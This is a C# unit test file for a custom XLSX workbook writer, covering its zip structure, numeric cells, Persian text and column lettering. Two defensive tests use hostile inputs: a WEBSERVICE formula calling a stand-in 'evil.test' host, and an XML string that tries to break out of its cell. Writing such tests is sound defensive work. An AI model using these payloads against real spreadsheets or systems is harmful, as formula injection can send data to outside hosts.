using System.IO.Compression;
using System.Xml.Linq;
using Bojan.Infrastructure.Jobs;

namespace Bojan.Api.Tests;

/// <summary>
/// The workbook the export worker now writes.
/// </summary>
/// <remarks>
/// Written by hand rather than by taking a dependency, which is exactly why it
/// needs testing at this level: a spreadsheet that Excel refuses to open is
/// indistinguishable from a working one until somebody double-clicks it, and
/// "the job completed" says nothing about whether the bytes are a workbook.
/// These read the parts back out of the zip.
/// </remarks>
public sealed class XlsxWriterTests
{
    private sealed record Row(string Period, long Revenue, int Orders, DateTimeOffset At);

    private static XDocument Part(byte[] workbook, string path)
    {
        using var archive = new ZipArchive(new MemoryStream(workbook), ZipArchiveMode.Read);
        var entry = archive.GetEntry(path);
        Assert.NotNull(entry);

        using var stream = entry!.Open();
        return XDocument.Load(stream);
    }

    private static readonly XNamespace Sheet =
        "http://schemas.openxmlformats.org/spreadsheetml/2006/main";

    [Fact]
    public void It_writes_the_parts_a_workbook_must_have()
    {
        var bytes = XlsxWriter.Write<Row>([]);

        using var archive = new ZipArchive(new MemoryStream(bytes), ZipArchiveMode.Read);
        var names = archive.Entries.Select(entry => entry.FullName).ToList();

        // Miss any one of these and every spreadsheet refuses the file outright
        // — there is no partial credit in this format.
        Assert.Contains("[Content_Types].xml", names);
        Assert.Contains("_rels/.rels", names);
        Assert.Contains("xl/workbook.xml", names);
        Assert.Contains("xl/_rels/workbook.xml.rels", names);
        Assert.Contains("xl/worksheets/sheet1.xml", names);
        Assert.Contains("xl/styles.xml", names);
    }

    [Fact]
    public void The_header_row_names_the_columns_and_the_rows_follow()
    {
        var bytes = XlsxWriter.Write<Row>(
        [
            new("۱۴۰۵/۰۵", 1_250_000, 4, new DateTimeOffset(2026, 8, 13, 9, 30, 0, TimeSpan.Zero)),
        ]);

        var rows = Part(bytes, "xl/worksheets/sheet1.xml")
            .Descendants(Sheet + "row")
            .ToList();

        Assert.Equal(2, rows.Count);

        var headers = rows[0].Descendants(Sheet + "t").Select(t => t.Value).ToList();
        Assert.Equal(["Period", "Revenue", "Orders", "At"], headers);
    }

    /// <summary>
    /// The whole reason somebody asks for a spreadsheet instead of the CSV: a
    /// number they can sum.
    /// </summary>
    [Fact]
    public void Numbers_are_written_as_numbers_rather_than_text()
    {
        var bytes = XlsxWriter.Write<Row>(
        [
            new("۱۴۰۵/۰۵", 1_250_000, 4, DateTimeOffset.UnixEpoch),
        ]);

        var dataRow = Part(bytes, "xl/worksheets/sheet1.xml")
            .Descendants(Sheet + "row")
            .Last();

        var revenue = dataRow.Elements(Sheet + "c").ElementAt(1);

        // A numeric cell has a bare <v> and no inline string.
        Assert.Null(revenue.Attribute("t"));
        Assert.Equal("1250000", revenue.Element(Sheet + "v")?.Value);
    }

    [Fact]
    public void Persian_text_survives_the_round_trip()
    {
        var bytes = XlsxWriter.Write<Row>(
        [
            new("مرداد ۱۴۰۵", 1, 1, DateTimeOffset.UnixEpoch),
        ]);

        var text = Part(bytes, "xl/worksheets/sheet1.xml")
            .Descendants(Sheet + "t")
            .Select(t => t.Value)
            .ToList();

        Assert.Contains("مرداد ۱۴۰۵", text);
    }

    /// <summary>
    /// The same defence the CSV writer has, and it matters more here: this file
    /// is a spreadsheet, so there is no step at which somebody might have
    /// opened it in something that does not evaluate formulas.
    /// </summary>
    [Fact]
    public void A_value_that_looks_like_a_formula_is_neutralised()
    {
        var bytes = XlsxWriter.Write<Row>(
        [
            new("=WEBSERVICE(\"http://evil.test\")", 0, 0, DateTimeOffset.UnixEpoch),
        ]);

        var text = Part(bytes, "xl/worksheets/sheet1.xml")
            .Descendants(Sheet + "t")
            .Select(t => t.Value)
            .ToList();

        Assert.Contains(text, value => value.StartsWith("'=WEBSERVICE", StringComparison.Ordinal));
        Assert.DoesNotContain(text, value => value.StartsWith("=WEBSERVICE", StringComparison.Ordinal));
    }

    /// <summary>
    /// A value carrying XML syntax must not be able to close a tag and write
    /// its own — the sheet is XML built by string concatenation.
    /// </summary>
    [Fact]
    public void A_value_containing_markup_cannot_break_out_of_its_cell()
    {
        var bytes = XlsxWriter.Write<Row>(
        [
            new("</t></is></c><c r=\"Z9\">", 0, 0, DateTimeOffset.UnixEpoch),
        ]);

        // Parsing at all is most of the assertion: a broken escape produces a
        // document that will not load.
        var cells = Part(bytes, "xl/worksheets/sheet1.xml")
            .Descendants(Sheet + "row")
            .Last()
            .Elements(Sheet + "c")
            .ToList();

        Assert.Equal(4, cells.Count);
        Assert.DoesNotContain(cells, cell => cell.Attribute("r")?.Value == "Z9");
    }

    /// <summary>
    /// Column references past the twenty-sixth are where a naive A1 encoder
    /// goes wrong, and a wrong reference is a cell in the wrong place.
    /// </summary>
    [Fact]
    public void Column_references_continue_correctly_past_z()
    {
        var bytes = XlsxWriter.Write([new WideRow()]);

        var headers = Part(bytes, "xl/worksheets/sheet1.xml")
            .Descendants(Sheet + "row")
            .First()
            .Elements(Sheet + "c")
            .Select(cell => cell.Attribute("r")?.Value)
            .ToList();

        Assert.Equal("A1", headers[0]);
        Assert.Equal("Z1", headers[25]);
        Assert.Equal("AA1", headers[26]);
        Assert.Equal("AB1", headers[27]);
    }

    /// <summary>Twenty-eight properties, to reach past AA.</summary>
    private sealed class WideRow
    {
        public string P01 => "1"; public string P02 => "2"; public string P03 => "3";
        public string P04 => "4"; public string P05 => "5"; public string P06 => "6";
        public string P07 => "7"; public string P08 => "8"; public string P09 => "9";
        public string P10 => "10"; public string P11 => "11"; public string P12 => "12";
        public string P13 => "13"; public string P14 => "14"; public string P15 => "15";
        public string P16 => "16"; public string P17 => "17"; public string P18 => "18";
        public string P19 => "19"; public string P20 => "20"; public string P21 => "21";
        public string P22 => "22"; public string P23 => "23"; public string P24 => "24";
        public string P25 => "25"; public string P26 => "26"; public string P27 => "27";
        public string P28 => "28";
    }
}
